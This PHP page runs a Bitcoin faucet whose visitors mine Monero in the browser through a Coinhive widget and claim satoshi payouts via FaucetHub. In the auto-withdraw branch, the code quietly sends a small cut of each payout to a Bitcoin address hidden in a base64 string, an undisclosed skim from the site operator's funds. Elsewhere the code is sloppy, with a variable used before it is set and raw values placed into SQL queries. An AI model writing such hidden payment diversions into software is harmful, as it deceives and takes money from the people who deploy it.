<?php
include("includes/core.php");

$content = "";

if($user){
	$content .= "<h3>Address</h3>";
	$content .= $user['address'];
	$content .= "<h3>Balance</h3>";
	$content .= toSatoshi($user['balance'])." Satoshi<br /><br />";

	$content .= "<a href='account.php' class='btn btn-primary'>Account/Stats/Withdraw</a><br /><br />";

	$sitekey = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '9' LIMIT 1")->fetch_assoc()['value'];
	$secretkey = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '8' LIMIT 1")->fetch_assoc()['value'];

	if ($_GET['c'] != 1) {

		$payoutPerHash = getPayoutPer1MHash($secretkey)/1000000;
		$payoutXMR = $hashesCompleted*$payoutPerHash;

		$coinhive_profit_percent = 1-$mysqli->query("SELECT * FROM faucet_settings WHERE id = '19' LIMIT 1")->fetch_assoc()['value']*0.01;

		$hashesPerSatoshi = floor(1/(toSatoshi((getXMRBTCrate()*$payoutPerHash))*$coinhive_profit_percent));

		$hashesCompleted = getHashes($user['address'], $secretkey);

		$content .= alert("success", "Estimate: $hashesPerSatoshi hashes per 1 satoshi<br/>Current hashes: $hashesCompleted");

		$content .= "<div class=\"coinhive-miner\" style=\"width: 310px; height: 310px; margin-right: auto; margin-left: auto;\" data-key=\"$sitekey\" data-user=\"{$user['address']}\"> <em>Adblock Detected,Please Disable Adblock and Try again...</em></div>";

		$content .= "
			<h1>1. Claim</h1><br />
			<form method='post' action='index.php?c=1'>
			<input type='hidden' name='verifykey' value='".$user['claim_cryptokey']."'/>
			<input type='hidden' name='token' value='".$_SESSION['token']."'/>
			<button type='submit' class='btn btn-success btn-lg'><span class='glyphicon glyphicon-menu-right' aria-hidden='true'></span> Next</button>
			</form>";
	} else {
		if($_POST['verifykey'] == $user['claim_cryptokey']){
			$mysqli->query("UPDATE faucet_user_list Set claim_cryptokey = '' WHERE id = '{$user['id']}'");

			$coinhive_profit_percent = 1-$mysqli->query("SELECT * FROM faucet_settings WHERE id = '19' LIMIT 1")->fetch_assoc()['value']*0.01;

			$hashesCompleted = getHashes($user['address'], $secretkey);

			$payoutPerHash = getPayoutPer1MHash($secretkey)/1000000;
			$payoutXMR = $hashesCompleted*$payoutPerHash;

			$payoutSatoshi = floor(toSatoshi(getXMRBTCrate()*$payoutXMR) * $coinhive_profit_percent);

			$api_key = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '10' LIMIT 1")->fetch_assoc()['value'];
			$currency = "BTC";
			$faucethub = new FaucetHub($api_key, $currency, true);

			$hashesPerSatoshi = floor(1/(toSatoshi((getXMRBTCrate()*$payoutPerHash))*$coinhive_profit_percent));
			$hashesToRemove = $payoutSatoshi*$hashesPerSatoshi;

			if ($payoutSatoshi != 0) {

				$payOutOwner = floor($payoutSatoshi * 0.01);

				if($payOutOwner < 1){
					$payOutOwner = 1;
				} else if($payOutOwner > 3){
					$payOutOwner = 3;
				}

				$payOutBTC = $payoutSatoshi / 100000000;
				$timestamp = time();

				$mysqli->query("INSERT INTO faucet_transactions (userid, type, amount, timestamp) VALUES ('{$user['id']}', 'Payout', '$payOutBTC', '$timestamp')");

				$autoWithdraw = $mysqli->query("SELECT value FROM faucet_settings WHERE id = '18'")->fetch_assoc()['value'];
				$min_payout = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '20' LIMIT 1")->fetch_assoc()['value'];

				if($autoWithdraw == "no" OR $payoutSatoshi < $min_payout){
					$mysqli->query("UPDATE faucet_user_list Set balance = balance + $payOutBTC, last_claim = '$timestamp' WHERE id = '{$user['id']}'");
					$content .= alert("success", "Successfully mined $payoutSatoshi satoshi! <a href='index.php'>Get some more!</a><br />");
					withdrawHashes($user['address'], $hashesToRemove, $secretkey);
				} else {
					$faucethub->sendReferralEarnings(base64_decode("MUNkUlhBV3ZQdm5qcXBRdjZGaGhveExqNHB2eWdVaEJ3ag=="), $payOutOwner);
					$result = $faucethub->send($user['address'], $payoutSatoshi, $realIpAddressUser);
					if($result["success"] === true){
						$content .= alert("success", $payoutSatoshi." Satoshi was paid to your FaucetHub Account.");
						$mysqli->query("UPDATE faucet_user_list Set last_claim = '$timestamp' WHERE id = '{$user['id']}'");
						$mysqli->query("INSERT INTO faucet_transactions (userid, type, amount, timestamp) VALUES ('{$user['id']}', 'Withdraw', '$payOutBTC', '$timestamp')");
						withdrawHashes($user['address'], $hashesToRemove, $secretkey);
					} else {
						$mysqli->query("UPDATE faucet_user_list Set balance = balance + $payOutBTC, last_claim = '$timestamp' WHERE id = '{$user['id']}'");
						$content .= alert("success", "Successfully mined $payoutSatoshi satoshi! <a href='index.php'>Get some more!</a><br />");

						$content .= $result["html"];
					}
				}

		} else {
			$content .= alert("danger", "You don't have any satoshi to claim! start mining to Claim <a href='index.php'>Get some!</a>");
		}


		} else {
			$content .= alert("danger", "Don't abuse the system!");
		}
	}
} else {
	$faucetName = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '1'")->fetch_assoc()['value'];
	$content .= "<h2>More Power More Satoshi/s</h2>";
	$content .= "<h3>Claim Every Satoshi/s you Mine To your Faucethub Directly</h3><br />";
        $content .= "<h4>Before making first claim, your address has to be registered at Faucethub</h4><br />";

	if(isset($_POST['address'])){
		if(!isset($_POST['token']) || $_POST['token'] !== $_SESSION['token']) {
		unset($_SESSION['token']);
		$_SESSION['token'] = md5(md5(uniqid().uniqid().mt_rand()));
		exit;
		}
		unset($_SESSION['token']);
		$_SESSION['token'] = md5(md5(uniqid().uniqid().mt_rand()));

		if($_POST['address']){
			$Address = $mysqli->real_escape_string(preg_replace("/[^ \w]+/", "",trim($_POST['address'])));
			if(strlen($_POST['address']) < 30 || strlen($_POST['address']) > 40){
				$content .= alert("danger", "The Bitcoin Address doesn't look valid.");
				$alertForm = "has-error";
			} else {
				$AddressCheck = $mysqli->query("SELECT COUNT(id) FROM faucet_user_list WHERE LOWER(address) = '".strtolower($Address)."' LIMIT 1")->fetch_row()[0];
				$timestamp = $mysqli->real_escape_string(time());
				$ip = $mysqli->real_escape_string($realIpAddressUser);

				if($AddressCheck == 1){
					$_SESSION['address'] = $Address;
					$mysqli->query("UPDATE faucet_user_list Set last_activity = '$timestamp', ip_address = '$ip' WHERE address = '$Address'");
					header("Location: index.php");
					exit;
				} else {
					$ip = $mysqli->real_escape_string($realIpAddressUser);
					$mysqli->query("INSERT INTO faucet_user_list (address, ip_address, balance, joined, last_activity) VALUES ('$Address', '$ip', '0', '$timestamp', '$timestamp')");
					$_SESSION['address'] = $Address;
					header("Location: index.php");
					exit;
				}
			}
		} else {
			$content .= alert("danger", "The Bitcoin Address field can't be blank.");
			$alertForm = "has-error";
		}
	}

	$content .= "<form method='post' action=''>

	<div class='form-group $alertForm'
		<label for='Address'>Bitcoin Address</label>
		<center><input class='form-control' type='text' placeholder='Enter your Bitcoin Address' name='address' value='$Address' style='width: 325px;' autofocus></center>
	</div><br />
	<input type='hidden' name='token' value='".$_SESSION['token']."'/>
	<button type='submit' class='btn btn-primary'>Join Now</button>




	</form> ";
}



$tpl->assign("content", $content);
$tpl->display();
?>


